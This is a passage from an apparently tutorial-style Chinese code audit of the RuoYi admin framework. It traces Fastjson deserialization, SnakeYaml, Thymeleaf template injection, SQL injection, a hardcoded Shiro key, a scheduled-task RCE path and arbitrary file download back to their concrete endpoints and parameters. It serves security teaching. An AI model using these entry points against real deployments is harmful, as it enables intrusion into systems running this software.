+<img src="C:/Users/powerful/Desktop/img/shiro权限匹配模式.jpg" srcset="/img/loading.gif" lazyload alt="shiro权限匹配模式" style="zoom:67%;" />
+
+<p>关于shiro的拦截匹配模式，Shiro的URL路径表达式为Ant格式有如下解释:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/hello：只匹配url，比如 http:/</span><span class="hljs-regexp">/7089.com/</span>hello<br><span class="hljs-regexp">/h?：只匹配url，比如 http:/</span><span class="hljs-regexp">/7089.com/</span>h+任意一个字符<br><span class="hljs-regexp">/hello/</span>*：匹配url下，比如 http:<span class="hljs-regexp">//</span><span class="hljs-number">7089</span>.com<span class="hljs-regexp">/hello/</span>xxxx 的任意内容，不匹配多个路径<br><span class="hljs-regexp">/hello/</span>**：匹配url下，比如 http:<span class="hljs-regexp">//</span><span class="hljs-number">7089</span>.com<span class="hljs-regexp">/hello/</span>xxxx/aaaa 的任意内容，匹配多个路径<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-2、Fastjson组件漏洞代码审计"><a href="#2-2、Fastjson组件漏洞代码审计" class="headerlink" title="2.2、Fastjson组件漏洞代码审计"></a>2.2、Fastjson组件漏洞代码审计</h4><p>本项目使用了<code>Fastjson 1.2.60</code>，<code>Fastjson &lt;= 1.2.68</code>都是存在漏洞的。</p>
+<p>已确定了Fastjson版本存在问题，进一步寻找触发Fastjson的漏洞点。我们关注两个函数<code>parse</code>和<code>parseObject</code>。</p>
+<p>搜索关键字发现本项目使用了<code>parseObject</code>，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/parseObject关键字搜索.jpg" srcset="/img/loading.gif" lazyload alt="parseObject关键字搜索" style="zoom:67%;" />
+
+<p>我们发现本项目使用的是<code>JSONObject.parseObject</code>方法，与第三套迷你天猫商城中<code>JSON.parseObject()</code>方法有所不同。JSONObject是一个继承自JSON的类，当调用JSONObject.parseObject（result）时，会直接调用父类的parseObject（String text）。两者也没什么区别，一个是用父类去调用父类自己的静态的parseObject（String text），一个是用子类去调用父类的静态parseObject（String text），两者调的是同一个方法。也是可以触发Fastjson反序列化漏洞的。</p>
+<p>下面我们追踪下流程，看看是否有接收用户输入的地方。</p>
+<p>①、双击进入<code>VelocityUtils.java</code>，第66行。代码如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/velocityUtils的66行.jpg" srcset="/img/loading.gif" lazyload alt="velocityUtils的66行" style="zoom:50%;" />
+
+<p>②、从代码中看到<code>JSONObject.parseObject(options);</code>需要一个参数为<code>options</code>，该参数通过第65行发现来自<code>genTable.getOptions();</code>，ctrl加鼠标左键跟进，<code>getOptions()</code>返回值为<code>options</code>，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/getOptions返回值.jpg" srcset="/img/loading.gif" lazyload alt="getOptions返回值" style="zoom:67%;" />
+
+<p>③、继续跟进<code>options</code>，根据作者注释理解这是一个<code>其它生成选项</code>的字段。如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/其他生成选项字段.jpg" srcset="/img/loading.gif" lazyload alt="其他生成选项字段" style="zoom: 67%;" />
+
+<p>④、我们回过头来，追溯下功能点。跟进<code>setTreeVelocityContext</code>，发现是<code>prepareContext</code>中调用了它，如下图所示（为了便于截图展示，删除了部分代码）：</p>
+<img src="C:/Users/powerful/Desktop/img/跟进setTreeVelocityContext.jpg" srcset="/img/loading.gif" lazyload alt="跟进setTreeVelocityContext" style="zoom:67%;" />
+
+<p>其中涉及到了一个判断条件，跟进一下，看如何触发该条件。跟进<code>GenConstants.TPL_TREE</code>，看到定义了一个常量字符为<code>tree</code>。如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/GenConstants判断条件.jpg" srcset="/img/loading.gif" lazyload alt="GenConstants判断条件"></p>
+<p><img src="C:/Users/powerful/Desktop/img/进入TPL_TREE.jpg" srcset="/img/loading.gif" lazyload alt="进入TPL_TREE"></p>
+<p>再跟进下<code>tplCategory</code>，该值来自于<code>genTable.getTplCategory();</code>如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/跟进tplCategory.jpg" srcset="/img/loading.gif" lazyload alt="跟进tplCategory" style="zoom:50%;" />
+
+<p>进入<code>genTable.getTplCategory();</code>后，看到<code>getTplCategory()</code>返回值就是<code>tplCategory</code>，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/getTplCategory返回值.jpg" srcset="/img/loading.gif" lazyload alt="getTplCategory返回值" style="zoom:67%;" />
+
+<p>继续跟进<code>tplCategory</code>，根据作者注释，这应该是是一个使用模板的字段。该字段应该有两个值，一个是<code>crud</code>，一个是<code>tree</code>。所以我们再找到功能点时，应该将这个字段值设为<code>tree</code>，如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/tplCategory字段含义.jpg" srcset="/img/loading.gif" lazyload alt="tplCategory字段含义"></p>
+<p>中间穿插跟了下判断条件，我们继续追踪功能点。</p>
+<p>⑤、回到<code>prepareContext()</code>方法，我们看下谁调用了他，发现<code>GenTaleServiceImpl.java</code>中第187行和250行都有所调用，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/谁调用了prepareContext.jpg" srcset="/img/loading.gif" lazyload alt="谁调用了prepareContext" style="zoom:67%;" />
+
+<p>⑥、单击进入<code>GenTaleServiceImpl.java</code>第187行，发现是<code>previewCode</code>方法使用了<code>VelocityUtils.prepareContext(table);</code>，其中<code>table参数</code>来自<code>genTableMapper.selectGenTableById(tableId);</code>根据<code>tableId</code>查询表信息返回的数据，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/table参数查询表数据返回.jpg" srcset="/img/loading.gif" lazyload alt="table参数查询表数据返回" style="zoom:67%;" />
+
+<p>也就是说，我们只能操控<code>tableId</code>参数。继续跟踪一下<code>previewCode</code>，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/previewCode方法.jpg" srcset="/img/loading.gif" lazyload alt="previewCode方法" style="zoom:67%;" />
+
+<p>⑦、（此处省略跳转到genTableService，无关紧要）ctrl加鼠标左键点击<code>previewCode</code>继续跟进，跳转到了<code>GenController</code>层，发现是<code>preview</code>使用了<code>genTableService.previewCode(tableId);</code>。如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/GenController的preview.jpg" srcset="/img/loading.gif" lazyload alt="GenController的preview" style="zoom:67%;" />
+
+<p>并且通过注释信息了解到该功能是<code>预览代码</code>，路径是<code>/tool/gen/preview</code>，从路径中获取<code>tableId</code>。</p>
+<p>既然这样，这条链是没办法利用Fastjosn反序列化漏洞了。</p>
+<p>梅开二度，找条别的链，继续试试。</p>
+<p>追踪了刚才搜索的四个点，发现<code>GenTaleServiceImpl.java</code>第286行这个参数也是我们可以操控的。</p>
+<p>追踪流程如下。</p>
+<p>（需要tplCategory&#x3D;tree才能进入该方法）</p>
+<p>①、<code>GenTaleServiceImpl.java</code>第286行<code>JSONObject.parseObject(options);</code>处理<code>options</code>参数，该值来自<code>String options = JSON.toJSONString(genTable.getParams());</code>，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/GenTaleServiceImpl的options值.jpg" srcset="/img/loading.gif" lazyload alt="GenTaleServiceImpl的options值" style="zoom:67%;" />
+
+<p>②、跟进<code>genTable.getParams()</code>，跳转到了<code>BASEEntity.java</code>代码中，因为<code>Gentable</code>继承<code>BASEEntity</code>。（此处写错了，看成set方法了，去看一眼set发现没有什么多余动作，传什么返回什么）根据判断条件，如果<code>params不等于null</code>的话，直接返回<code>params</code>。跟进<code>params</code>，注释表明该字段为<code>请求参数</code>，并且<code>params</code>被定义成<code>Map&lt;String, Object&gt;</code>，可以理解为params字段中可以传任何类型的值在里面。如下图所示（为便于截图展示，删除了部分代码）：</p>
+<img src="C:/Users/powerful/Desktop/img/请求字段params.jpg" srcset="/img/loading.gif" lazyload alt="请求字段params" style="zoom:67%;" />
+
+<p>③、回到<code>GenTaleServiceImpl.java</code>，查看谁调用了<code>validateEdit</code>，跳转到了<code>IGenTaleService</code>第99行处，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/validateEdit被调用.jpg" srcset="/img/loading.gif" lazyload alt="validateEdit被调用" style="zoom: 67%;" />
+
+<img src="C:/Users/powerful/Desktop/img/validateEdit的service层.jpg" srcset="/img/loading.gif" lazyload alt="validateEdit的service层" style="zoom:67%;" />
+
+<p>④、继续跟进<code>validateEdit</code>，跳转到了<code>GenController</code>层第142行，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/修改保存代码controller.jpg" srcset="/img/loading.gif" lazyload alt="修改保存代码controller" style="zoom:67%;" />
+
+<p>至此，我们将这条链追踪完了。确定了功能点为代码生成处的<code>修改保存生成业务</code>，该路径部分为<code>edit</code>，完整路径为<code>/tool/gen/edit</code>，请求方法为POST，并且主要关注<code>params</code>这个字段。</p>
+<h4 id="2-3、SnakeYaml组件漏洞代码审计"><a href="#2-3、SnakeYaml组件漏洞代码审计" class="headerlink" title="2.3、SnakeYaml组件漏洞代码审计"></a>2.3、SnakeYaml组件漏洞代码审计</h4><p>SnakeYaml在Java中，是用于解析YAML格式的库。</p>
+<p>在第三方组件漏洞审计处，确定了SnakeYaml版本为1.23，被定为存在漏洞。</p>
+<p>事实上，SnakeYaml几乎全版本都可被反序列化漏洞利用。</p>
+<h5 id="2-3-1、漏洞简述"><a href="#2-3-1、漏洞简述" class="headerlink" title="2.3.1、漏洞简述"></a>2.3.1、漏洞简述</h5><p>SnakeYaml支持反序列化Java对象，所以当<code>Yaml.load()</code>函数的参数外部可控时，攻击者就可以传入一个恶意类的yaml格式序列化内容，当服务端进行yaml反序列化获取恶意类时就会触发SnakeYaml反序列化漏洞。</p>
+<p>全局搜索漏洞函数关键字，发现本项目并没有使用到<code>Yaml.load()</code>函数，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/yamlload全局搜索.jpg" srcset="/img/loading.gif" lazyload alt="yamlload全局搜索" style="zoom: 50%;" />
+
+<p>提前透露下，该漏洞可以和本项目定时任务配合打出RCE效果。</p>
+<p>在这之前，请大家拓展学习下篇文章，补一下基础。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//www.mi<span class="hljs-number">1</span>k<span class="hljs-number">7</span>ea.com/<span class="hljs-number">2019</span>/<span class="hljs-number">11</span>/<span class="hljs-number">29</span>/Java-SnakeYaml<span class="hljs-variable">%E5</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%8</span>D<span class="hljs-variable">%E5</span><span class="hljs-variable">%BA</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E5</span><span class="hljs-variable">%88</span><span class="hljs-variable">%97</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%96</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E6</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%9</span>E/<br></code></pre></td></tr></table></figure>
+
+<p>该部分漏洞验证将在渗透测试漏洞挖掘章节中配合定时任务功能进行讲述。</p>
+<h4 id="2-4、Thymeleaf组件漏洞代码审计"><a href="#2-4、Thymeleaf组件漏洞代码审计" class="headerlink" title="2.4、Thymeleaf组件漏洞代码审计"></a>2.4、Thymeleaf组件漏洞代码审计</h4><p>在第三方组件漏洞审计时，了解到Thymeleaf组件版本为<code>2.0.0</code>，该版本存在SSTI（模板注入）漏洞。</p>
+<p>关于什么是Thymeleaf，推荐学习这篇文章：<code>https://waylau.gitbooks.io/thymeleaf-tutorial/content/docs/introduction.html</code></p>
+<h5 id="2-4-1、什么是SSTI（模板注入）漏洞"><a href="#2-4-1、什么是SSTI（模板注入）漏洞" class="headerlink" title="2.4.1、什么是SSTI（模板注入）漏洞"></a>2.4.1、什么是SSTI（模板注入）漏洞</h5><p>Server-Side Template Injection简称SSTI，也就是服务器端模板注入。</p>
+<p>所谓的模板即为<code>模板引擎</code>。</p>
+<p>本项目使用的Thymeleaf是众多模板引擎之一。还有其他Java常用的模板引擎，如：velocity，freemarker，jade等等。</p>
+<p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板加上用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
+<p>模板注入（SSTI）漏洞成因，是因为服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。</p>
+<h5 id="2-4-2、Thymeleaf模板注入漏洞简介"><a href="#2-4-2、Thymeleaf模板注入漏洞简介" class="headerlink" title="2.4.2、Thymeleaf模板注入漏洞简介"></a>2.4.2、Thymeleaf模板注入漏洞简介</h5><p>Thymeleaf模板注入形成原因，简单来说，在Thymeleaf模板文件中使用<code>th:fragment、</code>，<code>th:text</code>这类标签属性包含的内容会被渲染处理。并且在Thymeleaf渲染过程中使用<code>$&#123;...&#125;</code>或其他表达式中时内容会被Thymeleaf EL引擎执行。因此我们将攻击语句插入到<code>$&#123;...&#125;</code>表达式中，会触发Thymeleaf模板注入漏洞。</p>
+<p>如果带有<code>@ResponseBody</code>注解和<code>@RestController</code>注解则不能触发模板注入漏洞。因为<code>@ResponseBody</code>和<code>@RestController</code>不会进行View解析而是直接返回。所以这同样是修复方式。</p>
+<h5 id="2-4-3、发现SSTI（模板注入）漏洞点"><a href="#2-4-3、发现SSTI（模板注入）漏洞点" class="headerlink" title="2.4.3、发现SSTI（模板注入）漏洞点"></a>2.4.3、发现SSTI（模板注入）漏洞点</h5><p>我们在审计模板注入（SSTI）漏洞时，主要查看所使用的模板引擎是否有接受用户输入的地方。主要关注xxxController层代码。</p>
+<p>在Controller层，我们关注两点：<code>1、URL路径可控。</code>，<code>2、return内容可控。</code></p>
+<p>所谓可控，也就是接受输入。对应上面两个关注点，举例说明如下。</p>
+<p>1、URL路径可控</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/hello&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/whoami/&#123;name&#125;/&#123;sex&#125;&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span>  <span class="hljs-title function_">hello</span>(<span class="hljs-params"><span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;name&quot;</span>) <span class="hljs-built_in">String</span> name, <span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;sex&quot;</span>) <span class="hljs-built_in">String</span> sex</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span> + name + sex;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>2、return内容可控</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@PostMapping</span>(<span class="hljs-string">&quot;/getNames&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getCacheNames</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> fragment, ModelMap mmap</span>)<br>&#123;<br>	mmap.<span class="hljs-title function_">put</span>(<span class="hljs-string">&quot;cacheNames&quot;</span>, cacheService.<span class="hljs-title function_">getCacheNames</span>());<br>	<span class="hljs-keyword">return</span> prefix + <span class="hljs-string">&quot;/cache::&quot;</span> + fragment;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>视角转回到本项目。</p>
+<p>根据上面两个关注点，对<code>若依v4.2</code>进行了一番探索。并没有发现存在Thymeleaf模板注入漏洞点。</p>
+<p>但在<code>若依v4.7.1</code>发现存在<code>return内容可控</code>的情况。为了学习该漏洞，下面以<code>若依v4.7.1</code>版本进行Thymeleaf模板注入代码审计学习。</p>
+<p>在<code>若依v4.7.1</code>的<code>RuoYi-v4.7.1\ruoyi-admin\src\main\java\com\ruoyi\web\controller\monitor</code>下多了一个<code>CacheController.java</code>文件。该文件下有多个地方<code>Return内容可控</code>，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/多个return内容可控.jpg" srcset="/img/loading.gif" lazyload alt="多个return内容可控" style="zoom: 50%;" />
+
+<p>简单理解：接收到<code>fragment</code>后，在return处进行了模板路径拼接。</p>
+<p>根据代码我们知道根路径为<code>/monitor/cache</code>，各个接口路径分别为<code>/getNames</code>，<code>/getKeys</code>，<code>/getValue</code>。请求方法为<code>POST</code>，请求参数均为<code>fragment</code>。</p>
+<p>知道了这些内容，我们在渗透测试部分进行漏洞验证。</p>
+<p>系统还有存在其他漏洞点，大家可以自由发挥找一找。</p>
+<h3 id="3、单点漏洞审计"><a href="#3、单点漏洞审计" class="headerlink" title="3、单点漏洞审计"></a>3、单点漏洞审计</h3><h4 id="3-1、SQL注入漏洞代码审计"><a href="#3-1、SQL注入漏洞代码审计" class="headerlink" title="3.1、SQL注入漏洞代码审计"></a>3.1、SQL注入漏洞代码审计</h4><p>单点漏洞代码审计首当其冲当然要先看SQL注入漏洞是否存在，全局搜索关键字<code>$</code>，并限定文件类型为<code>.xml</code>，发现<code>sysDeptMapper.xml</code>和<code>sysUserMapper.xml</code>有存在SQL注入的地方，如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/sql注入mapper文件.jpg" srcset="/img/loading.gif" lazyload alt="sql注入mapper文件"></p>
+<p>挑个幸运的Mapper小伙伴，追踪下流程，找到他的注入点。</p>
+<p>那就选择<code>SysRoleMapper.xml</code>这个吧，刚刚搜索结果他们没在一起。如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/SQL注入RoleMapper.jpg" srcset="/img/loading.gif" lazyload alt="SQL注入RoleMapper"></p>
+<p>①、点击进入<code>SysRoleMapper.xml</code>，SQL注入点在第58行，使用<code>$</code>直接拼接了参数，如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/rolemapper的sql注入点位置.jpg" srcset="/img/loading.gif" lazyload alt="rolemapper的sql注入点位置"></p>
+<p>②、点击左侧箭头快速跳转到DAO层（IDEA中需要安装Free Mybatis plugin插件），如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/SQL注入点dao层.jpg" srcset="/img/loading.gif" lazyload alt="SQL注入点dao层"></p>
+<p>③、键盘按住Ctrl加鼠标左键，点击<code>selectRoleList</code>，查看谁调用了它。最终来到<code>SysRoleServiceImpl</code>的实现层，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/selectRoleList的调用.jpg" srcset="/img/loading.gif" lazyload alt="selectRoleList的调用" style="zoom:67%;" />
+
+<p>④、进入<code>SysRoleServiceImpl</code>后，再回溯到<code>SysRoleService</code>层，可使用左侧快速跳转按钮。或者选中<code>selectRoleList</code>后使用快捷键<code>ctrl+u</code>，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/SQL注入实现层.jpg" srcset="/img/loading.gif" lazyload alt="SQL注入实现层" style="zoom: 67%;" />
+
+<img src="C:/Users/powerful/Desktop/img/sql注入service层.jpg" srcset="/img/loading.gif" lazyload alt="sql注入service层" style="zoom: 67%;" />
+
+<p>⑤、键盘按住Ctrl加鼠标左键，点击<code>selectRoleList</code>，回溯到<code>Controller</code>层，最终发现是<code>SysRoleController</code>调用了这个方法，如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/sql注入service的controller调用.jpg" srcset="/img/loading.gif" lazyload alt="sql注入service的controller调用"></p>
+<p>⑥、点击进入，最终定位到<code>src\main\java\com\ruoyi\web\controller\system\SysRoleController.java</code>，第58行和第68行都有调用，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/SQL注入Controller层.jpg" srcset="/img/loading.gif" lazyload alt="SQL注入Controller层" style="zoom:67%;" />
+
+<p>⑦、键盘按住Ctrl加鼠标左键，点击<code>SysRole</code>，进入看看定义了哪些实体类，其中发现了<code>DataScope</code>，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/sysrole字段.jpg" srcset="/img/loading.gif" lazyload alt="sysrole字段" style="zoom:67%;" />
+
+<p>⑧、回顾追溯流程</p>
+<p>回顾下整理流程，如下所示：</p>
+<p><code>sysRoleMapper.xml</code> -&gt; <code>SysRoleMapper.java</code> -&gt; <code>SysRoleServiceImpl.java</code> -&gt; <code>ISysRoleService.java</code> -&gt; <code>SysRoleController.java</code></p>
+<p><img src="C:/Users/powerful/Desktop/img/回溯全流程.jpg" srcset="/img/loading.gif" lazyload alt="回溯全流程"></p>
+<p>简单说，我们从<code>XxxxMapper</code>文件追踪到<code>Controller</code>层，主要就是在找漏洞入口。顺带看看整个流程是否对参数有特殊处理。</p>
+<p>⑨、汇总信息</p>
+<p>最后，我们将追溯的过程，以及有用的信息汇总一下。</p>
+<ul>
+<li>通过Controller层，我们可以知道，漏洞URL路径为<code>/system/role/list</code></li>
+<li>通过Service层和Controller层的注释，我们大致知道该功能位于角色信息处。</li>
+</ul>
+<p>大致知道这些信息后，下一步访问WEB页面，找找这个功能，并通过渗透测试验证一下。</p>
+<p>剩下几个还存在SQL注入漏洞的地方，追溯过程留作业给你们。务必动手操作，加深印象。举一反三，形成笔记后，并提交到对应的作业处。</p>
+<h4 id="3-2、Shiro密钥硬编码代码审计"><a href="#3-2、Shiro密钥硬编码代码审计" class="headerlink" title="3.2、Shiro密钥硬编码代码审计"></a>3.2、Shiro密钥硬编码代码审计</h4><p>在看Shiro配置文件时，发现了Shiro密钥硬编码写在了代码文件中。代码位于<code>RuoYi-v4.2\ruoyi-framework\src\main\java\com\ruoyi\framework\config\ShiroConfig.java</code>，第331行。如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/shiro硬编码密钥.jpg" srcset="/img/loading.gif" lazyload alt="shiro硬编码密钥"></p>
+<p>在黑盒测试中，我们常使用爆破的方式来探测目标是否使用了常见的弱密钥。</p>
+<p>但在代码审计我们可以直接通过搜索关键字<code>setCipherKey</code>，来看看密钥是否硬编码在了代码中。</p>
+<p>攻击者在知道了密钥后，就可以构造恶意payload，经过序列化、AES加密、base64编码操作加工后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞，进而在目标机器上执行任意命令。</p>
+<p>既然我们从代码处知道了密钥，那么我们就可以直接对他进行反序列化攻击了。</p>
+<h4 id="3-3、定时任务功能漏洞代码审计"><a href="#3-3、定时任务功能漏洞代码审计" class="headerlink" title="3.3、定时任务功能漏洞代码审计"></a>3.3、定时任务功能漏洞代码审计</h4><p>在项目简介中，我们了解到本项目中有使用到定时任务功能。</p>
+<p>又根据官方文档的文件结构处，我们了解到本项目定时任务功能在<code>ruoyi-quartz </code>模块下，使用的是<code>quartz </code>框架。如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/ruoyi-quartz文件结构.jpg" srcset="/img/loading.gif" lazyload alt="ruoyi-quartz文件结构" style="zoom: 67%;" />
+
+
+
+<p>进入<code>ruoyi-quartz </code>模块<code>src\main\java\com\ruoyi\quartz</code>下，我们先关注<code>controller</code>文件代码。我们知道<code>Controller</code>也是控制层，主要负责具体的业务模块流程的控制，简单说就是与前台互交，接受前台传来的参数后，再向<code>Service层</code>传输。</p>
+<p>打开<code>controller</code>文件下，有两个代码文件，分别是<code>SysJobController</code>和<code>SysJobLogController</code>。根据代码注释了解了大致作用，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/SysJobController注释信息.jpg" srcset="/img/loading.gif" lazyload alt="SysJobController注释信息" style="zoom:67%;" />
+
+<img src="C:/Users/powerful/Desktop/img/SysJobLogController注释信息.jpg" srcset="/img/loading.gif" lazyload alt="SysJobLogController注释信息" style="zoom:67%;" />
+
+
+
+<p>现在，我们对<code>SysJobController下的run方法</code>进行追踪，根据注释该方法为任务调度立即执行一次，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/run方法立即执行一次.jpg" srcset="/img/loading.gif" lazyload alt="run方法立即执行一次" style="zoom:67%;" />
+
+<p>Ctrl加鼠标左键点击<code>jobService.run(job)</code>，进入Service层后，无其他执行代码，继续跟踪到实现层，最终代码位于<code>RuoYi-v4.2\ruoyi-quartz\src\main\java\com\ruoyi\quartz\service\impl\SysJobServiceImpl.java</code>第180行到188行。如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/run的实现层代码.jpg" srcset="/img/loading.gif" lazyload alt="run的实现层代码" style="zoom:67%;" />
+
+<p>第182,183行作用为通过调度任务ID查询调度信息。</p>
+<p>第185行，实例化了<code>JobDataMap</code>。<code>JobDataMap</code> 通过它的超类 org.quartz.util.DirtyFlagMap 实现了java.util.Map 接口，你可以向 JobDataMap 中存入键&#x2F;值对，那些数据对可在你的 Job 类中传递和进行访问。这是一个向你的 Job 传送配置的信息便捷方法。简单说，Job 运行时的信息保存在 <code>JobDataMap</code> 实例中。</p>
+<p>最终在第187行，使用<code>scheduler.triggerJob(JobKey var1, DataMap var2)</code>为触发标识JobDetail（立即执行）。<code>JobDetail</code>用来描述Job的实现类及其它相关的静态信息，如Job名字、描述、关联监听器等等信息。其中<code>triggerJob()</code>方法需要两个参数，分别为<code>Jobkey</code>和<code>dataMap</code>。<code>dataMap</code>来自上面输入的运行时信息。而此处的<code>Jobkey</code>是JobDetail创建的的唯一标识。简单说，到了这就开始执行定时任务了。</p>
+<p>但最终方法的调用是在<code>QuartzDisallowConcurrentExecution</code>或<code>QuartzJobExecution</code>中用<code>JobInvokeUtil.invokeMethod(sysJob);</code>反射完成的。</p>
+<p><code>QuartzDisallowConcurrentExecution</code>或<code>QuartzJobExecution</code>两者区别根据代码注释可以知道一个禁止并发执行，一个允许并发执行。这两个参数也是可以从前端中设置的。但不论那种，最终都是调用的<code>JobInvokeUtil.invokeMethod(sysJob);</code>。</p>
+<p>进入<code>JobInvokeUtil.invokeMethod(sysJob);</code>，最终方法实现如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/invokeMethod最终调用.jpg" srcset="/img/loading.gif" lazyload alt="invokeMethod最终调用" style="zoom:67%;" />
+
+<p>解读一下。</p>
+<p>①、第25行到28行，为获取处理数据，打个端点可以直观看出来，如下图所示（建议自己动手操作看一下）：</p>
+<img src="C:/Users/powerful/Desktop/img/invokeMethod获取参数断点.jpg" srcset="/img/loading.gif" lazyload alt="invokeMethod获取参数断点" style="zoom:67%;" />
+
+<p>②、第30到39行，有一个判断。若依支持两种方式调用，分别为支持<code>Bean</code>调用和<code>Class</code>类调用。此处判断我理解为通过<code>beanname</code>判断是否为有效的classname。也就是调用目标字符串是使用<code>bean</code>方式调用，还是使用<code>Class</code>方式调用。</p>
+<p>此处，可以创建两种方式的目标字符串后，在<code>if (!isValidClassName(beanName))</code>处打个断点，分别执行跟踪一下，就能看明白了。</p>
+<img src="C:/Users/powerful/Desktop/img/invokeMethod的class方式1.jpg" srcset="/img/loading.gif" lazyload alt="invokeMethod的class方式1" style="zoom: 50%;" />
+
+<img src="C:/Users/powerful/Desktop/img/invokeMethod的class方式2.jpg" srcset="/img/loading.gif" lazyload alt="invokeMethod的class方式2" style="zoom:50%;" />
+
+<p>另一种调用方式，大家动手自己打个断点操作一下。进入管理系统，访问<code>系统监控 - 定时任务</code>，选择bean方式调用的任务，点击<code>更多操作 - 执行一次</code>。</p>
+<p>至此，定时任务流程到这就结束了。他是如何RCE的呢？老规矩，在渗透测试部分我们进行验证。</p>
+<h4 id="3-4、任意文件读取-x2F-下载漏洞代码审计"><a href="#3-4、任意文件读取-x2F-下载漏洞代码审计" class="headerlink" title="3.4、任意文件读取&#x2F;下载漏洞代码审计"></a>3.4、任意文件读取&#x2F;下载漏洞代码审计</h4><p>一般开发人员也都有比较好的习惯，对于注释方面写的也比较清楚。</p>
+<p>我拿到一个项目，习惯大致浏览下项目代码（主要看注释），梳理下功能。</p>
+<p>在本项目中，发现存在一处下载功能。</p>
+<p>代码位于<code>RuoYi-v4.2\ruoyi-admin\src\main\java\com\ruoyi\web\controller\common\CommonController.java</code>第96行-第111行。通过注释一目了然该部分代码的作用。如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/任意文件下载代码.jpg" srcset="/img/loading.gif" lazyload alt="任意文件下载代码" style="zoom: 50%;" />
+
+<p>通过全局搜索关键字<code>resourceDownload</code>，发现并没有其他功能调用他。</p>
+<p>既然这样，只能分析代码，自己构造请求了。</p>
+<p>①、首先，漏洞代码点位于第118行，使用了<code>FileUtils.writeBytes()</code>方法输出指定文件的byte数组，即将文件从服务器下载到本地。其中该函数中有两个参数，分别为<code>downloadPath</code>和<code>response.getOutputStream()</code>。</p>
+<p><strong><code>getOutputStream()</code>方法用于返回Servlet引擎创建的字节输出流对象，Servlet程序可以按字节形式输出响应正文。</strong></p>
+<p>②、<code>downloadPath</code>来自第103行，是由<code>localPath</code>和<code>StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);</code>组成。</p>
